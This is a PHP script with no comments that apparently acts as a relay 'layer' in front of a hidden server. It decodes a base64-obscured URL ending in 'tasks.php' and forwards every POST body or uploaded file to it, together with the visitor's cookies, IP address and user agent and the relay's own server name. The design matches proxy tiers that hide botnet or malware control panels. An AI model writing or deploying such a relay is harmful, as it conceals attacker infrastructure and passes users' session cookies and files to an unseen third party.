<?php
//$url = parse_url(base64_decode("base64_ecoded_path_to_tasks.php"));
$url = parse_url(base64_decode("base64_ecoded_path_to_tasks.php"));
 if (!isset($url['port'])) {
    $url['port'] = 80;
}
if (($real_server = fsockopen($url['host'], $url['port'])) === false) {
    die('ERROR');
}

$request = "POST {$url['path']} HTTP/1.0\r\n";
$request .= "Host: {$url['host']}\r\n";
$request .= "Cookie: {$_SERVER['HTTP_COOKIE']}; ip={$_SERVER['REMOTE_ADDR']};\r\n";
$request .= "User-Agent: {$_SERVER['HTTP_USER_AGENT']}\r\n";
$request .= "Connection: close\r\n";

if ($_SERVER["CONTENT_TYPE"] == "application/x-www-form-urlencoded") {
    if (($data = file_get_contents('php://input')) === false) {
        die('ER_1');
    }
    $data .= "&ip=" . urlencode($_SERVER['REMOTE_ADDR']) . "&layer=" . $_SERVER['SERVER_NAME'] . $_SERVER['SCRIPT_NAME'] . "";

    $request .= "Content-Type: application/x-www-form-urlencoded\r\n";
    $request .= "Content-Length: " . strlen($data) . "\r\n";
    fwrite($real_server, $request . "\r\n" . $data);

    $result = '';
    while (!feof($real_server))
        $result .= fread($real_server, 1024);
    fclose($real_server);
    echo substr($result, strpos($result, "\r\n\r\n") + 4);
} else {

    $filePath = $_FILES['data']['tmp_name'];
    $fileName = basename($_FILES['data']['name']);
    $boundary = "---------------------" . substr(md5(rand(0, 32000)), 0, 10);

    $fileHeaders = "--" . $boundary . "\r\n";
    $fileHeaders .= "Content-Disposition: form-data; name=\"data\"; filename=\"" . $fileName . "\"\r\n";
    $fileHeaders .= "Content-Type: " . mime_content_type($filePath) . "\r\n\r\n";
    $fileHeadersTail = "\r\n--" . $boundary . "--\r\n";

    $contentLength = strlen($fileHeaders) + filesize($filePath) + strlen($fileHeadersTail);

    $headers = $request;
    $headers .= "Content-type: multipart/form-data, boundary=" . $boundary . "\r\n";
    $headers .= "Content-length: " . $contentLength . "\r\n\r\n";
    $headers .= $fileHeaders;

    fputs($real_server, $headers);

    $fp2 = fopen($_FILES['data']['tmp_name'], "r");
    while (!feof($fp2)) {
        fputs($real_server, fgets($fp2, 1024 * 100));
    }
    fclose($fp2);
    fputs($real_server, $fileHeadersTail);
	
	$result = '';
    while (!feof($real_server))
        $result .= fread($real_server, 1024);
    fclose($real_server);
    echo $result;
}